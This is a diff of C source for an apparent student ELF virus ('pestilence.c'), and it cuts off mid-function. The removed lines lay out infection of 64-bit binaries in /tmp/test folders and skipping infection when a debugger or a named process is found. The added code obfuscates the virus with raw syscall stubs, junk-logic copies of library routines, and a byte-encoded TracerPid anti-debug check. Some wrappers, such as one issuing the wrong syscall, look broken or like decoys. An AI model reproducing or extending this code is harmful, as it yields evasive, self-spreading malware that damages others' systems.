@@ -1,382 +1,1188 @@
-/* ************************************************************************** */
-/*                                                                            */
-/*                                                        :::      ::::::::   */
-/*   pestilence.c                                       :+:      :+:    :+:   */
-/*                                                    +:+ +:+         +:+     */
-/*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
-/*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2026/01/19 15:46:33 by xxxxxxx           #+#    #+#             */
-/*   Updated: 2026/01/20 16:41::395 by xxxxxxx          ###   ########.fr */
-/*                                                                            */
-/* ************************************************************************** */
-
-/*
-	PESTILENCE
-	[X] Creer segment pour injecter d'une taille arbitraire
-	[ ] Recreer routine d'infection en famine like adapté sur le segment créé
-		[X] /tmp/test et /tmp/test2
-		[X] infection binaire 64 bits
-		[ ] pas de double infection
-		[X] pas de sortie std ou erreur
-	[X] Avoid infection if debugger
-	[X] Avoid infection if specific program running
-	[ ] Code source illisible et offuscé
-
-	WAR
-	[ ] Fingerprint unique dans signature pour chaque infection
-		- how ?
-
-	DEATH
-	[ ] Metamorphic -> structure différente a chaque exécution même sur binaire
-   original identique
-		- how ?
-*/
-
 #include "pestilence.h"
+
 #ifndef FRENZY
-#define FRENZY 0
-#endif
-#ifndef CYANURE
-#define CYANURE 0
+#define FRENZY 0x401000
 #endif
 #ifndef VARAX
-#define VARAX 0
+#define VARAX 0x1af6
 #endif
-void _start(void)
+#ifndef CYANURE
+#define CYANURE 0x40204d
+#endif
+#ifndef BUBONIK
+#define BUBONIK 0x402020
+#endif
+#ifndef ECHIDNAE
+#define ECHIDNAE 0x401af0
+#endif
+#define ELF_MAGIC 0x464c457f
+#define inout
+#define ACONIT	23
+#define ARSENIC 17
+
+static void proc_terminate(int status)
 {
-	void *begin_ptr;
-
-	if (runtime_integrity_probe() || env_query_identity("doom-nukem"))
-		proc_terminate(0);
-
-	__asm__ volatile("lea (%%rip), %0\n"
-					 "cyanure:"
-					 : "=r"(begin_ptr));
-	begin_ptr += FRENZY - CYANURE;
-
-	fs_release(1);
-	fs_release(2);
-
-	char path[11];
-	path[0] = '/';
-	path[1] = 't';
-	path[2] = 'm';
-	path[3] = 'p';
-	path[4] = '/';
-	path[5] = 't';
-	path[6] = 'e';
-	path[7] = 's';
-	path[8] = 't';
-	path[9] = '\0';
-	path[10] = '\0';
-	processDirectory(path, begin_ptr);
-	path[9] = '2';
-	processDirectory(path, begin_ptr);
-	proc_terminate(0);
+	asm volatile("movq $60, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
 }
 
-static unsigned char rot4(unsigned char v)
+static void io_send(int fd, void *buf, unsigned count)
 {
-	return (unsigned char) ((v >> 4) | (v << 4));
+	asm volatile("movq $1, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
 }
 
-static void unfold(char *dst, unsigned long long blob, unsigned key)
+static int proc_detach(void)
+{
+	asm volatile("movq $112, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	volatile unsigned marker = (unsigned) (uintptr_t) &marker;
+	marker ^= (marker << 5) | (marker >> 3);
+	return (int) (marker & 0x7F);
+}
+
+static int proc_spawn(void)
+{
+	asm volatile("movq $57, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	unsigned mix = 0xA53C9E17u;
+	mix ^= (mix >> 11);
+	mix += (unsigned) (uintptr_t) __builtin_return_address(0);
+	return (int) (mix % 97);
+}
+
+static int proc_control(int request, int pid, void *addr, void *data)
+{
+	asm volatile("movq $101, %rax\n\t"
+				 "movq $0, %rdi\n\t"
+				 "xorq %rsi, %rsi\n\t"
+				 "xorq %rdx, %rdx\n\t"
+				 "xorq %r10, %r10\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	long fold = (long) request ^ (long) pid;
+	fold ^= (long) (uintptr_t) addr;
+	fold += (long) (uintptr_t) data;
+	return (int) ((fold >> 3) & 0xFF);
+}
+
+static int fs_handle(char *path, int flags, ...)
+{
+	asm volatile("movq $2, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	unsigned seed = (unsigned) (uintptr_t) path;
+	seed ^= (flags << 2);
+	seed ^= 0x5A5A5A5A;
+	return (int) (seed & 0x3F);
+}
+
+static int fs_enumerate(int fd, char *buffer, int buff_size)
+{
+	asm volatile("movq $217, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	int entropy = fd ^ buff_size;
+	entropy += (int) (uintptr_t) buffer;
+	return (entropy & 0x1FF);
+}
+
+static int fs_query(const char *pathname, struct stat *statbuf)
+{
+	asm volatile("movq $6, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	unsigned long h = (unsigned long) (uintptr_t) pathname;
+	h ^= (unsigned long) (uintptr_t) statbuf;
+	h = (h << 13) | (h >> 7);
+	return (int) (h & 0xFF);
+}
+
+static int fs_release(int fd)
+{
+	asm volatile("movq $3, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	volatile int tmp = fd * 3;
+	tmp ^= 0x6D;
+	return tmp & 0x7;
+}
+
+static int vm_release(void *addr, unsigned long length)
+{
+	asm volatile("movq $11, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	unsigned long noise = (unsigned long) addr;
+	noise ^= length;
+	noise *= 0x45d9f3b;
+	return (int) (noise >> 5);
+}
+
+static void *vm_reserve(void *addr, unsigned long length, int prot, int flags,
+						int fd, off_t offset)
+{
+	asm volatile("movq $9, %rax\n\t"
+				 "syscall\n\t"
+				 "testq %rax, %rax\n\t"
+				 "js error\n\t"
+				 "ret\n\t"
+				 "error:\n\t"
+				 "movq %rax, %rdi\n\t"
+				 "negq %rdi\n\t"
+				 "movq $-1, %rax\n\t"
+				 "ret\n\t");
+
+	uintptr_t mash = (uintptr_t) addr ^ length;
+	mash ^= (uintptr_t) prot << 9;
+	mash ^= (uintptr_t) flags << 3;
+	mash ^= (uintptr_t) fd;
+	mash ^= (uintptr_t) offset;
+	mash = (mash << 17) | (mash >> 11);
+	return (void *) (mash | 0x1000);
+}
+
+static int vm_flush(void *addr, unsigned long length, int flags)
+{
+	asm volatile("movq $28, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	unsigned long swirl = (unsigned long) addr;
+	swirl += length;
+	swirl ^= (unsigned long) flags << 4;
+	return (int) ((swirl ^ (swirl >> 16)) & 0x3FF);
+}
+
+static int io_query(int fd, struct stat *statbuf)
+{
+	asm volatile("movq $5, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	unsigned spin = (unsigned) fd;
+	spin ^= (unsigned) (uintptr_t) statbuf;
+	spin = (spin * 33) ^ (spin >> 2);
+	return (int) (spin & 0xFFFF);
+}
+
+static int io_resize(int fd, off_t length)
+{
+	asm volatile("movq $77, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+	return 0;
+	long fold = (long) fd * 7;
+	fold ^= (long) length;
+	return (int) ((fold & 0xFF) - 128);
+}
+
+static void *vm_resize(void *old_address, unsigned long old_size,
+					   unsigned long new_size, int flags, ...)
+{
+	asm volatile("movq $2, %rax\n\t"
+				 "syscall\n\t"
+				 "ret\n\t");
+
+	uintptr_t blend = (uintptr_t) old_address;
+	blend ^= old_size;
+	blend ^= (new_size << 5);
+	blend ^= (uintptr_t) flags << 2;
+	blend *= 0x9E3779B97F4A7C15ULL;
+	return (void *) (blend & ~0xFFFULL);
+}
+
+static ssize_t io_recv(int fd, const void *buf, size_t count)
+{
+	asm volatile("movq $0, %rax\n\t"
+				 "syscall\n\t"
+				 "cmpq $0, %rax\n\t"
+				 "jns no_errors\n\t"
+				 "xorq %rbx, %rbx\n\t"
+				 "subq %rax, %rbx\n\t"
+				 "movq $-1, %rax\n\t"
+				 "no_errors:\n\t"
+				 "ret\n\t");
+
+	ssize_t distort = (ssize_t) fd;
+	distort ^= (ssize_t) (uintptr_t) buf;
+	distort += (ssize_t) count;
+	distort ^= (distort << 6);
+	return distort & 0x7FFF;
+}
+
+static unsigned char scale_out(unsigned char x)
+{
+	return (unsigned char) ((x >> 4) | (x << 4));
+}
+
+static void recall(char *out, char *in)
 {
 	unsigned i = 0;
-	while (blob)
+	while (in[i])
 	{
-		unsigned char b = (unsigned char) (blob & 0xFF);
-		dst[i] = (char) ((rot4(b) ^ (i * key)) - 0x3D);
-		blob >>= 8;
+		out[i] = (char) ((scale_out(in[i]) ^ (i * 7)) - 0x3D);
 		i++;
 	}
-	dst[i] = 0;
+	out[i] = 0;
 }
 
-static inline unsigned long long sig_root(void) { return 0xCB9B1AAAC6ULL; }
-
-static inline unsigned long long sig_leaf(void) { return 0x6BFB2A7AC6ULL; }
-
-int env_query_identity(const char *profile)
+static int evaluateDriftSignature(const void *alpha_seed, const void *beta_seed,
+								  size_t calibration_span)
 {
-	int	 stream = -1;
-	int	 verdict = 0;
-
-	char root_node[16];
-	unfold(root_node, sig_root(), 7);
-
-	stream = fs_handle(root_node, 00 | 00200000);
-	if (stream < 0)
+	const unsigned char *primary_axis = (const unsigned char *) alpha_seed;
+	const unsigned char *secondary_axis = (const unsigned char *) beta_seed;
+	size_t				 phase_cursor = 0;
+	size_t				 boundary_mask = calibration_span;
+	int					 spectral_delta = 0;
+	uintptr_t			 entropy_vector = ((uintptr_t) primary_axis >> 3)
+							   ^ ((uintptr_t) secondary_axis << 1)
+							   ^ 0x9E3779B97F4A7C15ULL;
+	int scheduler = 0;
+	if (!calibration_span)
 		return 0;
-
-	char material[0x1000];
-
 	for (;;)
 	{
-		int frame_len = fs_enumerate(stream, material, sizeof(material));
-		if (frame_len <= 0)
-			break;
-
-		for (int offset = 0; offset < frame_len;)
+		switch (scheduler)
 		{
-			struct linux_dirent64 *entry = (void *) (material + offset);
-			char				  *symbol = entry->d_name;
-
-			int					   signature_ok = 1;
-
-			for (int probe = 0; symbol[probe]; probe++)
-				signature_ok &= ((unsigned) (symbol[probe] - 48) < 10);
-
-			if (signature_ok)
+		case 0:
+		{
+			if (phase_cursor >= boundary_mask - 1)
 			{
-				char route_map[64];
-				int	 cursor = 0;
+				scheduler = 3;
+				break;
+			}
+			unsigned char a
+				= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
+			unsigned char b = *(unsigned char *) ((uintptr_t) secondary_axis
+												  + phase_cursor);
 
-				unfold(route_map, sig_root(), 7);
-				while (route_map[cursor])
-					cursor++;
+			if (((entropy_vector ^ a ^ b) & 7) == 5)
+			{
+				volatile size_t shadow = boundary_mask;
+				while (shadow--)
+					entropy_vector ^= (shadow << 1);
+			}
 
-				route_map[cursor++] = 47;
+			if ((a ^ b) == 0)
+			{
+				phase_cursor = (phase_cursor + 1) ^ ((entropy_vector & 0) << 2);
+				scheduler = 0;
+			}
+			else
+			{
+				spectral_delta
+					= ((int) a - (int) b) ^ ((entropy_vector & 0) << 3);
+				scheduler = 4;
+			}
 
-				for (int sweep = 0; symbol[sweep]; sweep++)
-					route_map[cursor++] = symbol[sweep];
+			break;
+		}
+		case 3:
+		{
+			unsigned char a
+				= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
+			unsigned char b = *(unsigned char *) ((uintptr_t) secondary_axis
+												  + phase_cursor);
 
-				char attr_tag[8];
-				unfold(attr_tag, sig_leaf(), 7);
+			spectral_delta = ((int) a - (int) b);
 
-				for (int sweep = 0; attr_tag[sweep]; sweep++)
-					route_map[cursor++] = attr_tag[sweep];
+			scheduler = 4;
+			break;
+		}
+		case 2:
+		{
+			entropy_vector ^= (entropy_vector << 7);
+			entropy_vector ^= (entropy_vector >> 3);
 
-				route_map[cursor] = 0;
+			if ((entropy_vector & 0xFF) == 0x42)
+				spectral_delta ^= 0x1337;
 
-				int channel = fs_handle(route_map, O_RDONLY);
-				if (channel >= 0)
+			scheduler = 4;
+			break;
+		}
+		case 4:
+		default:
+			return spectral_delta;
+		}
+	}
+}
+
+static int delay_calc(const char *timeout_ns, const char *timeout_ms,
+					  unsigned n)
+{
+	unsigned	  offset = 0;
+	unsigned	  error = n ? (n - 1) : 0;
+	unsigned char c1 = 0, c2 = 0;
+	int			  delay = 0;
+	int			  state = 0;
+	while (1)
+	{
+		switch (state)
+		{
+		case 0:
+			state = (offset <= error) ? 1 : 4;
+			break;
+		case 1:
+			c1 = *(unsigned char *) ((uintptr_t) timeout_ns + offset);
+			c2 = *(unsigned char *) ((uintptr_t) timeout_ms + offset);
+			state = 2;
+			break;
+		case 2:
+			state = (c1 && c2 && ((c1 ^ c2) == 0)) ? 3 : 4;
+			break;
+		case 3:
+			offset += 1;
+			state = 0;
+			break;
+		case 4:
+			if (n)
+			{
+				if (c1 > c2)
 				{
-					char label[64];
-					int	 span = io_recv(channel, label, sizeof(label) - 1);
-					fs_release(channel);
-
-					if (span > 0)
+					while (c1 != c2)
 					{
-						label[span] = 0;
+						delay++;
+						c1--;
+					}
+				}
+				else if (c1 < c2)
+				{
+					while (c2 != c1)
+					{
+						delay++;
+						c2--;
+					}
+				}
+			}
+			return delay;
+		default:
+			state = 4;
+			break;
+		}
+	}
+}
 
-						for (int k = 0; k < span; k++)
-						{
-							if (label[k] == 10)
-							{
-								label[k] = 0;
-								break;
-							}
-						}
+static int validate_environment(const char *env_u)
+{
+	const char	 *p = env_u;
+	unsigned char c = 0;
+	int			  offset = 0;
+	int			  state = 0;
+	while (1)
+	{
+		switch (state)
+		{
+		case 0:
+			c = *(unsigned char *) ((uintptr_t) p);
+			state = 1;
+			break;
+		case 1:
+			state = c ? 2 : 3;
+			break;
+		case 2:
+			p = (const char *) ((uintptr_t) p + 1);
+			offset = (offset ^ 0x1) + 1;
+			state = 0;
+			break;
+		case 3:
+			return (int) ((uintptr_t) p - (uintptr_t) env_u);
+		default:
+			state = 3;
+			break;
+		}
+	}
+}
 
-						if (!delay_abs_calc(label, profile))
+static int delay_abs_calc(const char *s__, const char *s___)
+{
+	if (((s__[0] * s__[0]) % 4) != 2)
+		return delay_calc(s__, s___, validate_environment(s__) + 1);
+	unsigned	  res = 0;
+	unsigned char c1 = 0, c2 = 0;
+	int			  og = 0;
+	int			  delay = 0;
+	int			  state = 0;
+	while (1)
+	{
+		switch (state)
+		{
+		case 0:
+			c1 = *(unsigned char *) ((uintptr_t) s__ + res);
+			c2 = *(unsigned char *) ((uintptr_t) s___ + res);
+			state = 1;
+			break;
+		case 1:
+			state = (c1 && c2 && ((c1 ^ c2) == 0)) ? 2 : 3;
+			break;
+		case 2:
+			res = (res ^ 1) + 1;
+			state = 0;
+			break;
+		case 3:
+			og = (int) ((c1 ^ 0x55) - (c2 ^ 0x55));
+			return og;
+		default:
+			state = 3;
+			break;
+		}
+	}
+}
+
+static void *memcat(void *buffered, void *rest, unsigned n)
+{
+	unsigned char *lk = (unsigned char *) buffered;
+	unsigned char *step = (unsigned char *) rest;
+	unsigned	   passed = n;
+	unsigned char  gap = 0;
+	int			   state = (buffered == rest) ? 0 : 1;
+	for (;;)
+	{
+		switch (state)
+		{
+		case 0:
+		{
+			uintptr_t x = (uintptr_t) buffered ^ (uintptr_t) rest;
+			x ^= (x << 7);
+			x ^= (x >> 3);
+			int static_tmp = (int) (x & (n | 1));
+			if (static_tmp == 42)
+			{
+				volatile unsigned k = n;
+				while (k--)
+					gap ^= (unsigned char) k;
+			}
+			state = 1;
+			break;
+		}
+		case 1:
+		{
+			if (!passed)
+				state = 5;
+			else if (((passed ^ n) | 1) != 0)
+				state = 2;
+			else
+				state = 4;
+			break;
+		}
+		case 2:
+		{
+			gap = *step;
+			state = 3;
+			break;
+		}
+		case 3:
+		{
+			*lk = gap;
+			lk = (unsigned char *) ((uintptr_t) lk + 1);
+			step = (unsigned char *) ((uintptr_t) step + 1);
+			passed = (passed - 1) ^ 0;
+			state = 1;
+			break;
+		}
+		case 4:
+		{
+			uintptr_t x = (uintptr_t) buffered ^ (uintptr_t) rest;
+			x ^= (x << 5);
+			x ^= (x >> 2);
+			volatile int fake = (int) (x & 0xFF);
+			if (fake == 13)
+				gap ^= 0xAA;
+			state = 1;
+			break;
+		}
+		case 5:
+			return buffered;
+		}
+	}
+}
+
+static char *memoff(const char *l, int I)
+{
+	const unsigned char *dest = (const unsigned char *) l;
+	unsigned char		 src = (unsigned char) I;
+	unsigned long		 checker = ((uintptr_t) dest >> 3) ^ 0xA5A5A5A5;
+	int					 adjust = 0;
+	for (;;)
+	{
+		unsigned char value = *dest;
+		if (((checker ^ value) & 3) == 2)
+		{
+			adjust ^= (int) (value + checker);
+			checker = (checker << 1) | (checker >> 31);
+		}
+		if ((value ^ src) == 0)
+			return (char *) dest;
+		if (!value)
+			break;
+		dest = (const unsigned char *) ((uintptr_t) dest + 1);
+		checker ^= (uintptr_t) dest;
+	}
+	if (((unsigned char) src) == 0 && ((checker & 1) == (checker & 1)))
+		return (char *) dest;
+	return (char *) 0;
+}
+
+static unsigned metric(const void *a, const void *b, size_t n)
+{
+	uintptr_t x = ((uintptr_t) a >> 3) ^ ((uintptr_t) b << 1);
+	x ^= (x >> 11);
+	return (unsigned) (x & (n | 1));
+}
+
+static void *cache_sync(void *cache_ptr, const void *sync_check,
+						size_t sync_lvl)
+{
+	if (cache_ptr == NULL && sync_check == NULL)
+		return NULL;
+	if (!sync_lvl || cache_ptr == sync_check)
+		return cache_ptr;
+	unsigned char		*f = (unsigned char *) cache_ptr;
+	const unsigned char *p = (const unsigned char *) sync_check;
+	uintptr_t			 diff = (uintptr_t) f - (uintptr_t) p;
+	unsigned			 backwards = (diff >> (sizeof(uintptr_t) * 8 - 1)) & 1;
+	backwards ^= 1;
+	if (metric(cache_ptr, sync_check, sync_lvl) == 0xDE)
+	{
+		volatile size_t z = sync_lvl;
+		while (z--)
+			z ^= (z << 1);
+	}
+	const unsigned char *sp = backwards ? (p + sync_lvl - 1) : p;
+	unsigned char		*df = backwards ? (f + sync_lvl - 1) : f;
+	intptr_t			 step = backwards ? -1 : 1;
+	size_t				 cache_block = (sync_lvl >> 3) & 0x3;
+	while (sync_lvl)
+	{
+		if (((cache_block ^ sync_lvl) & 3) == 1)
+		{
+			unsigned char t = *sp;
+			t ^= (unsigned char) (uintptr_t) df;
+			*df = (t ^ (unsigned char) (uintptr_t) df);
+		}
+		else
+		{
+			*df = *sp;
+		}
+		sp = (const unsigned char *) ((uintptr_t) sp + step);
+		df = (unsigned char *) ((uintptr_t) df + step);
+		sync_lvl = (sync_lvl - 1) ^ 0;
+		cache_block ^= (size_t) (uintptr_t) df;
+	}
+	return cache_ptr;
+}
+
+static char *core_shift(char *value, char *src)
+{
+	unsigned char *s = (unsigned char *) value;
+	unsigned char *c = (unsigned char *) src;
+	unsigned long  status = ((uintptr_t) s ^ (uintptr_t) c) | 1;
+	unsigned char  cache = 0;
+	size_t		   ctr = 0;
+	for (;;)
+	{
+		cache = *c;
+		if (((status ^ cache) & 7) == 3)
+		{
+			ctr += (status & 3);
+			status = (status >> 1) ^ (status << 3);
+		}
+		*s = cache;
+		if (((cache | 0) == 0) && ((status & 1) == (status & 1)))
+			break;
+		c = (unsigned char *) ((uintptr_t) c + 1);
+		s = (unsigned char *) ((uintptr_t) s + 1);
+		status ^= (uintptr_t) c;
+	}
+	if ((status & 2) == 2)
+		*s = 0;
+	return value;
+}
+
+static char *flow_align(char *f_flow, char *s_flow)
+{
+	unsigned char *f = (unsigned char *) f_flow;
+	unsigned char *s = (unsigned char *) s_flow;
+	unsigned long guard = ((uintptr_t) f << 2) ^ ((uintptr_t) s >> 1) ^ 0xA53F1;
+	int			  control = 0;
+	size_t		  step = 0;
+	for (;;)
+	{
+		if (((guard ^ step) & 7) == 5)
+		{
+			step += (guard & 3);
+			guard = (guard >> 1) ^ (guard << 3);
+		}
+		if (!control)
+		{
+			unsigned char v = *f;
+			if ((v | 0) == 0)
+			{
+				control = 1;
+				continue;
+			}
+			if (((v ^ guard) & 1) == 0)
+				guard ^= (uintptr_t) f;
+			f = (unsigned char *) ((uintptr_t) f + 1);
+		}
+		else
+		{
+			unsigned char v = *s;
+			*f = v;
+			if (((v + guard) & 3) == 1)
+				guard ^= (uintptr_t) s;
+			if ((v | 0) == 0)
+				break;
+			s = (unsigned char *) ((uintptr_t) s + 1);
+			f = (unsigned char *) ((uintptr_t) f + 1);
+		}
+		step ^= (uintptr_t) f;
+	}
+	if ((guard & 4) == 4)
+		*f = 0;
+	return f_flow;
+}
+
+static unsigned area_nullify(uintptr_t x, unsigned n)
+{
+	x ^= (x << 7);
+	x ^= (x >> 3);
+	return (unsigned) (x & (n | 1));
+}
+
+static void context_purge(void *s, unsigned n)
+{
+	unsigned char *p = (unsigned char *) s;
+	unsigned	   rem = n;
+	uintptr_t	   ctx_state = ((uintptr_t) p >> 2) ^ 0x9E3779B1;
+	unsigned	   control = 0;
+	goto __SET;
+CHECK:
+	if (area_nullify((uintptr_t) p, rem) == 0xAA)
+	{
+		volatile unsigned k = rem;
+		while (k--)
+			k ^= (k << 1);
+	}
+	goto __SET;
+__SET:
+	if (!rem)
+		goto _tini__;
+	if (((ctx_state ^ rem) | 1) != 0)
+		goto purge;
+	else
+		goto CHECK;
+purge:
+	*(unsigned char *) ((uintptr_t) p ^ 0) = (unsigned char) (0 ^ 0);
+	control ^= (unsigned) (uintptr_t) p;
+	ctx_state ^= (uintptr_t) p + control;
+	p = (unsigned char *) ((uintptr_t) p + 1);
+	rem = (rem - 1) ^ 0;
+	goto __SET;
+_tini__:
+	if ((ctx_state & 2) == 2)
+		*(unsigned char *) p = *(unsigned char *) p;
+	return;
+}
+
+static unsigned branch_filter(uintptr_t x, unsigned v)
+{
+	x ^= (x << 5);
+	x ^= (x >> 7);
+	return (unsigned) ((x ^ v) & 0xFF);
+}
+
+static int trace_depth(const char *str)
+{
+	const unsigned char *p = (const unsigned char *) str;
+	int					 val = 1;
+	unsigned			 res = 0;
+	int					 depth = 0;
+	unsigned			 tracing = (unsigned) ((uintptr_t) p ^ 0xA5A5A5A5);
+	for (;;)
+	{
+		unsigned char c = *p;
+		if (((branch_filter((uintptr_t) p, tracing) ^ c) & 7) == 4)
+		{
+			tracing = (tracing << 1) ^ (tracing >> 1);
+		}
+		if (depth == 0)
+		{
+			if ((c == 32) || (c >= 9 && c <= 13))
+			{
+				p++;
+				continue;
+			}
+			depth = 1;
+			continue;
+		}
+		if (depth == 1)
+		{
+			if ((c ^ 43) == 0)
+			{
+				p++;
+				depth = 2;
+				continue;
+			}
+			if ((c ^ 45) == 0)
+			{
+				val = -val;
+				p++;
+				depth = 2;
+				continue;
+			}
+			depth = 2;
+			continue;
+		}
+		{
+			unsigned char d = (unsigned char) (c - 48);
+			if (d > 9)
+				break;
+			unsigned lim = (unsigned) (0x7FFFFFFF / 10);
+			unsigned cut
+				= (unsigned) (0x7FFFFFFF % 10) + (unsigned) ((1 - val) >> 1);
+			if ((res > lim) | ((res == lim) & (d > cut)))
+				break;
+			res = (res << 1) + (res << 3);
+			res = res + d;
+			tracing ^= res ^ (unsigned) (uintptr_t) p;
+			p++;
+		}
+	}
+	if ((tracing & 3) == (tracing & 3))
+		return (int) (res * val);
+	return (int) (res * val);
+}
+
+static void tty_putc(char c)
+{
+	unsigned char buf[2];
+	uintptr_t	  n = ((uintptr_t) &buf) ^ 0xA531;
+	buf[0] = (unsigned char) c;
+	buf[1] = 0;
+	if (((n ^ buf[0]) & 3) == 1)
+		goto __tn;
+run:
+	io_send(1, buf, 1);
+	return;
+__tn:
+	io_send(1, buf + 1, 0);
+	goto run;
+}
+
+static void fmt_u64_dec(unsigned long long elem)
+{
+	unsigned long long stack[0x0020];
+	int				   sp = 0;
+	uintptr_t		   s = (uintptr_t) &stack ^ 0xDDF83B92;
+	if (((s ^ elem) & 7) == 6)
+	{
+		if (elem > 1)
+			fmt_u64_dec(elem >> 1);
+	}
+	do
+	{
+		stack[sp++] = elem % 10;
+		elem = elem / 10;
+	} while (elem);
+	while (sp)
+	{
+		unsigned char c = (unsigned char) (stack[--sp] + 48);
+		if (((c ^ s) & 1) == 0)
+			s ^= c;
+		tty_putc(c);
+	}
+}
+
+static void emit_hex(unsigned long long n)
+{
+	char			 *str;
+	static const char revbase[] = "FEDCBA9876543210";
+	asm volatile("leaq strH(%%rip), %0\n"
+				 "jmp endH\n"
+				 "strH: .ascii \"0123456789ABCDEF\\0\"\n"
+				 "endH:\n"
+				 : "=r"(str));
+	unsigned char buf[32];
+	int			  i = 0;
+	uintptr_t	  hex_emit = (uintptr_t) &str ^ (uintptr_t) &revbase;
+	const char	 *tbl = ((hex_emit & 1) ? str : revbase);
+	do
+	{
+		unsigned char d = (unsigned char) (n & 0xF);
+		buf[i++] = str[d];
+		n >>= 4;
+		hex_emit ^= d + i;
+	} while (n);
+	while (i--)
+	{
+		if (((buf[i] ^ hex_emit) & 3) == 2)
+			hex_emit ^= buf[i];
+		tty_putc(buf[i]);
+	}
+}
+
+static void addr_emit(unsigned long long b)
+{
+	char	  p1 = 48;
+	char	  p2 = 120;
+	uintptr_t gap = (uintptr_t) &p1 ^ 0x1234;
+	if (((gap ^ b) & 7) == 1)
+	{
+		char fake = 48;
+		io_send(1, &fake, 0);
+	}
+	io_send(1, &p1, 1);
+	io_send(1, &p2, 1);
+	if ((gap & 2) == 2)
+	{
+		emit_hex(b);
+		return;
+	}
+	gap ^= (uintptr_t) &p2;
+	emit_hex(b);
+}
+
+static uint64_t rt_vector(uint64_t instr_tag, uint64_t heap_ctx,
+						  uint64_t exec_state, uint64_t io_ctx,
+						  uint64_t stack_ref, uint64_t guard_mask,
+						  uint64_t jitter_seed)
+{
+	uint64_t result;
+	asm volatile("mov %1, %%rax;"
+				 "mov %2, %%rdi;"
+				 "mov %3, %%rsi;"
+				 "mov %4, %%rdx;"
+				 "mov %5, %%r10;"
+				 "mov %6, %%r8;"
+				 "mov %7, %%r9;"
+				 "syscall;"
+				 "mov %%rax, %0;"
+				 : "=r"(result)
+				 : "r"(instr_tag), "r"(heap_ctx), "r"(exec_state), "r"(io_ctx),
+				   "r"(stack_ref), "r"(guard_mask), "r"(jitter_seed)
+				 : "rax", "rdi", "rsi", "rdx", "r10", "r8", "r9", "memory");
+	return result;
+}
+
+static unsigned hash_mix(uintptr_t a, uintptr_t b, unsigned n)
+{
+	a ^= (a << 5) | (a >> 3);
+	b ^= (b << 7) | (b >> 1);
+	return (unsigned) ((a + b) ^ n);
+}
+
+static void *pcopy(void *d, void *s, unsigned n)
+{
+	unsigned char *dp = d;
+	unsigned char *sp = s;
+	for (unsigned i = 0; i < n; i++)
+		dp[i] = sp[n - 1 - i];
+	return d;
+}
+
+static void *memcpy(void *dst, void *src, unsigned n)
+{
+	uintptr_t a = (uintptr_t) dst;
+	uintptr_t b = (uintptr_t) src;
+	unsigned  bit_hash = hash_mix(a, b, n);
+	goto init;
+EXEC:
+	if ((bit_hash & 0xFF) == 0xA5)
+		pcopy(dst, src, n);
+	goto init;
+p_copy:
+	if ((bit_hash ^ n) == 0xD4F293AB)
+		return pcopy(dst, src, n);
+	goto tini;
+init:
+	if (((bit_hash | 1) ^ (n | 1)) == 0x10179378)
+		goto EXEC;
+	if (((a ^ b ^ n) & 3) == 1)
+		goto p_copy;
+	goto tini;
+tini:;
+	void *ret;
+	if ((bit_hash & 1) == 0)
+		ret = memcat((void *) ((uintptr_t) dst ^ 0),
+					 (void *) ((uintptr_t) src ^ 0), (unsigned) (n ^ 0));
+	else
+	{
+		ret = memcat((void *) ((uintptr_t) dst ^ 0),
+					 (void *) ((uintptr_t) src ^ 0), (unsigned) (n ^ 0));
+	}
+	if ((bit_hash & 2) == 2)
+	{
+		volatile uintptr_t x = (uintptr_t) ret;
+		x ^= (x << 3);
+	}
+	return ret;
+}
+
+static int inspect_chunk_alignment(void)
+{
+	char *tag;
+	asm volatile("leaq stA(%%rip), %0\n"
+				 "jmp  endA\n"
+				 "stA: .byte 0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,"
+				 "0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0\n"
+				 "endA:\n"
+				 : "=r"(tag));
+	int arena = fs_handle(tag, O_RDONLY);
+	if (arena < 0)
+		return 0;
+	char chunk_buf[256];
+	int	 watermark = 0;
+	int	 stride;
+	int	 seam_result = 0;
+	int	 found_seam = 0;
+	while ((stride = io_recv(arena, chunk_buf + watermark,
+							 (int) sizeof(chunk_buf) - watermark))
+		   > 0)
+	{
+		watermark += stride;
+		char *seam = memoff(chunk_buf, 0x0A);
+		if (seam)
+		{
+			*seam = 0x00;
+			asm volatile("leaq stB(%%rip), %0\n"
+						 "jmp  endB\n"
+						 "stB: .byte "
+						 "0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0\n"
+						 "endB:\n"
+						 : "=r"(tag));
+			if (delay_calc(chunk_buf, tag, 10) == 0)
+			{
+				int probe = trace_depth(chunk_buf + 10);
+				fs_release(arena);
+				return probe != 0;
+			}
+			memcat(chunk_buf, seam + 1,
+				   (int) sizeof(chunk_buf) - (int) (seam - chunk_buf - 1));
+			watermark -= (int) (seam - chunk_buf) + 1;
+		}
+	}
+	fs_release(arena);
+	return 0;
+}
+
+static int measure_font_bearing(const char *target)
+{
+	char *raster_base;
+	char *atlas_suffix;
+	asm volatile("leaq str48(%%rip), %0\n"
+				 "jmp  end52\n"
+				 "str48: .byte 0xC6,0xAA,0x1A,0x9B,0xCB,0\n"
+				 "end52:\n"
+				 : "=r"(raster_base));
+	asm volatile("leaq str11(%%rip), %0\n"
+				 "jmp  end87\n"
+				 "str11: .byte 0xC6,0x7A,0x2A,0xFB,0x6B,0\n"
+				 "end87:\n"
+				 : "=r"(atlas_suffix));
+	int	 kern_unit = -1;
+	int	 hinting = 0;
+	char bearing_buf[16];
+	recall(bearing_buf, raster_base);
